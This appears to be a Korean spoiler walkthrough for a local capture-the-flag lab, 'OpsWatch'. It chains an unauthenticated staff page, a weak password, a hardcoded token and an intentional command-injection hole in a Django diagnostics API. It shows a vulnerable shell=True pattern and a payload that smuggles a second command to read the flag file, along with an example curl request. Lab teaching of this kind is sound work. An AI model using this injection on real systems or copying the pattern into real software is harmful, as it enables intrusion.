# OpsWatch 풀이 (스포일러)

대상은 이 저장소의 로컬 실습만입니다.

- 베이스 URL: `http://127.0.0.1:8000`
- 모든 계정·토큰·FLAG는 가짜입니다.
- 다른 호스트, 공인 주소, 실제 시스템에 같은 요청을 보내지 마세요.

## 1. 유지보수 ID

브라우저에서 `http://127.0.0.1:8000/staff/` 를 엽니다. 인증이 없습니다.

야간유지보수 담당 박도윤의 **콘솔 ID**가 `maint` 로 나옵니다.

## 2. 약한 비밀번호

`http://127.0.0.1:8000/login/` 에서 ID `maint` 와 흔한 실습 비밀번호를 시도합니다.  
이 랩의 값은 `maint123` 입니다. 실패해도 계정이 잠기지 않습니다.

로그인 후 `/dashboard/` 에서 시드된 CPU·메모리 카드를 볼 수 있습니다.

## 3. 지원 스크립트 토큰

`http://127.0.0.1:8000/support/` 에서 `opswatch-healthcheck.sh` 를 받습니다.  
파일 안에 실습용 토큰이 하드코딩되어 있습니다.

```
OPSWATCH_TOKEN="ow-lab-internal-9f3c2a1b7e44"
```

주석에 `POST http://127.0.0.1:8000/api/internal/diagnose/` 안내가 있습니다.

## 4. 진단 API 접근

화면: `http://127.0.0.1:8000/admin/diagnostics/`  
(Django 관리자 사이트가 아닙니다.)

- 쿠키: 로그인 세션
- 헤더: `X-OpsWatch-Token: ow-lab-internal-9f3c2a1b7e44`
- CSRF: 페이지 폼의 `csrfmiddlewaretoken` 또는 쿠키 `csrftoken`

세션 없이 호출하면 401, 토큰이 없으면 403입니다.

정상 진단 예(컨테이너 내부 `extra_hosts` 기준):

대상 `web-01.lab.local` → `getent hosts` 결과.

호스트에서 Django를 직접 실행 중이면 셸이 꺼져 403이 납니다. Compose로 띄운 뒤에만 5단계가 됩니다.

## 5. 명령 결합으로 FLAG 읽기

의도적 취약점 위치: `inventory/services/diagnostics.py` 의 `build_lab_command()`.

```python
return f"/usr/bin/getent hosts {target}"
```

이 문자열이 `subprocess.run(..., shell=True)` 로 실행됩니다.

진단 대상 입력 예 (이 랩의 localhost 컨테이너 전용):

```
web-01.lab.local; cat /opt/challenge/flag.txt
```

결과는 HTML로 삽입되지 않고 `<pre>` 의 `textContent` 로만 표시됩니다.  
성공 시 출력에 다음 가짜 FLAG가 포함됩니다.

```
FLAG{OPSWATCH_LAB_CMDI_LOCAL_ONLY}
```

curl 예시는 세션 쿠키와 CSRF가 필요합니다. 브라우저 진단 화면을 쓰는 것이 실습에 충분합니다.

```powershell
# 로그인 폼에서 csrftoken + sessionid 를 받은 뒤에만, 그리고 127.0.0.1 에만.
# 아래는 형식 예시이며, 쿠키 값은 본인 세션으로 교체합니다.
curl.exe -s -X POST "http://127.0.0.1:8000/api/internal/diagnose/" `
  -H "Content-Type: application/json" `
  -H "X-CSRFToken: <csrf>" `
  -H "X-OpsWatch-Token: ow-lab-internal-9f3c2a1b7e44" `
  -H "Cookie: sessionid=<session>; csrftoken=<csrf>" `
  --data "{\"target\":\"web-01.lab.local; cat /opt/challenge/flag.txt\"}"
```
